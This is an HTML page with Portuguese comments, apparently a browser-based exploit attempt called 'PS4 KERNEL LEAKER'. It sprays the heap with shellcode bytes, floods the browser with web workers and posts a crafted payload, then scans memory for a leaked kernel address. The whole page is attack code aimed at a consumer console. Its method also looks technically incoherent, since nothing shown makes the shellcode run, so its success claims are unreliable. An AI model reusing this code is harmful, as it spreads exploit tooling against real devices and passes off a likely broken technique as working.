<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>PS4 KERNEL LEAKER (OPTIMIZED)</title>
    <style>
        body { background-color: #000; color: #0f0; font-family: monospace; text-align: center; padding: 20px; display: flex; flex-direction: column; justify-content: center; height: 90vh; }
        h1 { font-size: 2em; margin-bottom: 20px; border-bottom: 2px solid #0f0; display: inline-block; }
        #status { font-size: 1.5em; border: 2px solid #555; padding: 20px; background: #111; color: #aaa; margin-bottom: 20px; }
        #leak-display { font-size: 2.5em; color: #fff; font-weight: bold; background: #004; padding: 10px; display: none; }
        .success { background-color: #050 !important; color: #fff !important; border-color: #0f0 !important; }
        .ready { color: #ff0 !important; border-color: #ff0 !important; }
    </style>
</head>
<body>

    <h1>KERNEL LEAKER v2</h1>
    <div id="status">INICIALIZANDO...</div>
    <div id="leak-display"></div>

    <script>
        // --- CONFIGURAÇÃO ---
        const TARGET_THREADS = 417; 
        const SPRAY_SIZE = 512;
        const TARGET_OFFSET = 384; 
        const ADDR_BYTE_3 = 0x40; // Endereço 0x40...

        let workers = [];
        let heapSpray = [];
        let scannerInterval = null;
        
        // Blobs
        const blob = new Blob(["setInterval(()=>{}, 100000)"], {type:'text/javascript'});
        const url = URL.createObjectURL(blob);
        const killerBlob = new Blob(["self.close()"], {type:'text/javascript'});
        const killerUrl = URL.createObjectURL(killerBlob);

        // --- SHELLCODE (Assembly) ---
        // Pega endereço de retorno da pilha e escreve no nosso array
        const code = new Uint8Array([
            0x48, 0x8B, 0x04, 0x24,       // mov rax, [rsp]
            0x48, 0x8D, 0x3D, 0x08, 0x00, 0x00, 0x00, // lea rdi, [rip+8]
            0x48, 0x89, 0x07,             // mov [rdi], rax
            0xC3,                         // ret
            0x00, 0x00, 0x00, 0x00,       // Slot Leitura
            0x00, 0x00, 0x00, 0x00        // Slot Leitura
        ]);

        // FASE 1: SPRAY (Fazer isso PRIMEIRO, com calma)
        function init() {
            document.getElementById('status').innerText = "1. ALOCANDO MEMÓRIA (SPRAY)...";
            
            setTimeout(() => {
                try {
                    const code32 = new Uint32Array(code.buffer);
                    // Criamos menos arrays, mas maiores, para economizar overhead
                    for(let i=0; i<600; i++) { 
                        let arr = new Uint32Array(0x4000); 
                        for(let k=0; k < arr.length; k += code32.length) {
                            for(let j=0; j < code32.length; j++) {
                                if (k+j < arr.length) arr[k+j] = code32[j];
                            }
                        }
                        heapSpray.push(arr);
                    }
                    document.getElementById('status').innerText = "SPRAY CONCLUÍDO. SUBINDO THREADS...";
                    document.getElementById('status').className = "ready";
                    
                    // Só agora iniciamos as threads
                    startThreads();
                    
                } catch(e) {
                    document.getElementById('status').innerText = "ERRO: OOM. Reinicie o PS4.";
                }
            }, 500);
        }

        // FASE 2: THREADS
        function startThreads() {
            let i = setInterval(() => {
                if (workers.length < TARGET_THREADS) {
                    workers.push(new Worker(url));
                    // Atualiza status a cada 50 pra não travar a UI
                    if(workers.length % 50 === 0) {
                         document.getElementById('status').innerText = `WORKERS: ${workers.length} / ${TARGET_THREADS}`;
                    }
                } else {
                    clearInterval(i);
                    document.getElementById('status').innerText = "ESTABILIZANDO (4s)...";
                    
                    // Inicia o Scanner ANTES do ataque
                    scannerInterval = setInterval(scanMemory, 200);
                    
                    setTimeout(attack, 4000);
                }
            }, 30);
        }

        // FASE 3: ATAQUE
        function attack() {
            const st = document.getElementById('status');
            if(st.classList.contains('success')) return;
            
            st.innerText = ">>> EXECUTANDO SHELLCODE <<<";
            
            // Payload do Kernel
            const payload = new Uint8Array(SPRAY_SIZE);
            payload.fill(0x00); 
            payload[TARGET_OFFSET] = 0x00;
            payload[TARGET_OFFSET+1] = 0x00;
            payload[TARGET_OFFSET+2] = 0x00;
            payload[TARGET_OFFSET+3] = ADDR_BYTE_3; // 0x40

            setInterval(() => {
                const w = new Worker(killerUrl);
                w.terminate();
                try {
                    if(workers.length > 0) workers[0].postMessage(payload);
                } catch(e){}
            }, 10);
        }

        // FASE 4: SCANNER
        function scanMemory() {
            // Olha apenas os primeiros slots dos arrays para ser rápido
            for(let i=0; i<heapSpray.length; i+=5) { 
                const arr = heapSpray[i];
                // Procura na região onde o shellcode deveria escrever
                for(let k=4; k<64; k+=8) { 
                   // Se o valor mudou...
                   if (arr[k] != 0 && arr[k] != 0xC3078948) { 
                       // Verifica se parece um ponteiro de Kernel (High bytes != 0)
                       if (arr[k+1] != 0) { 
                           foundLeak(arr[k], arr[k+1]);
                           return;
                       }
                   }
                }
            }
        }

        function foundLeak(low, high) {
            clearInterval(scannerInterval);
            
            // Converte para Hex
            const hLow = (low >>> 0).toString(16).padStart(8, '0');
            const hHigh = (high >>> 0).toString(16).padStart(8, '0');
            const fullAddr = `0x${hHigh}${hLow}`;
            
            const st = document.getElementById('status');
            st.innerText = "SUCESSO! KERNEL LEAK ENCONTRADO!";
            st.className = "success";
            
            const disp = document.getElementById('leak-display');
            disp.style.display = "block";
            disp.innerText = fullAddr;

            // Para tudo
            workers.forEach(w => w.terminate());
            workers = [];
        }

        // Start
        setTimeout(init, 1000);

    </script>
</body>
</html>
